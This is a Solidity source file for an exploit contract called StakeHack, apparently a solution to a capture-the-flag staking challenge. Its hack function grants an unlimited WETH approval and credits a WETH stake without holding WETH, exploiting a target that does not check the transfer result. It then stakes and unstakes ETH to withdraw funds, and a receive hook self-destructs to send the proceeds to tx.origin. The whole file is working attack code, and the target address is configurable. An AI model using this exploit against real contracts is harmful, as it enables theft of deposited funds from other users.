// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract StakeHack {
    address public target;
    address public weth;

    constructor(address _target, address _weth) payable {
        target = _target;
        weth = _weth;
    }

    function hack() external {
        weth.call(abi.encodeWithSignature("approve(address,uint256)", target, type(uint256).max));
        target.call(abi.encodeWithSignature("StakeWETH(uint256)", 0.001 ether + 1));
        target.call{value: 0.001 ether + 1}(abi.encodeWithSignature("StakeETH()"));
        target.call(abi.encodeWithSignature("Unstake(uint256)", 0.001 ether));
    }

    receive() external payable {
        selfdestruct(payable(tx.origin));
    }
}
